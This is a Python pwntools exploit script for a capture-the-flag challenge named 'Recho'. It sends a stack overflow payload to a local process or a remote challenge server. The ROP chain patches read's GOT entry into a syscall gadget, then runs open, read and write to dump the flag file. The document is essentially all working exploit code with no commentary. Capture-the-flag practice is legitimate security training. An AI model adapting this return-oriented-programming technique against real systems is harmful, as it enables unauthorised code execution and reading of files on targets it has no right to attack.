#coding:utf-8
from pwn import *
# context.log_level = 'debug'

debug = 1
if debug == 1:
	r = process('./Recho')
	# gdb.attach(r)
else:
	r = remote('111.198.29.45', 44509)

r.recvuntil('Welcome to Recho server!\n')

pop_rax = 0x4006fc
pop_rdx = 0x4006fe
pop_rsi_r15 = 0x4008a1
pop_rdi = 0x4008a3
flag_addr = 0x0000000000601058						
read_addr = 0x000000000601030
flag_save_addr = 0x601070 
flag_size = 100

def set_syscall():
	return p64(pop_rdi) + p64(read_addr) + p64(pop_rax) + p64(0xe) + p64(0x000000000040070D)


def func_call(rax, rdx, rsi, rdi):
	return p64(pop_rax) + p64(rax) + p64(0x000000000040089A) + p64(0) + p64(1) + p64(read_addr) + p64(rdx) + p64(rsi) + p64(rdi) + p64(0x0000000000400880) + 'a' * 8 * 7

shellcode = 'a' * 0x38 + set_syscall() + func_call(2, 0, 0, flag_addr) + func_call(0, flag_size, flag_save_addr, 3) + func_call(1, flag_size, flag_save_addr, 1)

r.send('2000'.ljust(0x10, '\x00'))
r.send(shellcode)
r.shutdown('write')
r.recv(0x2a)
log.info('flag is %s'%r.recv().split('\x00')[0])
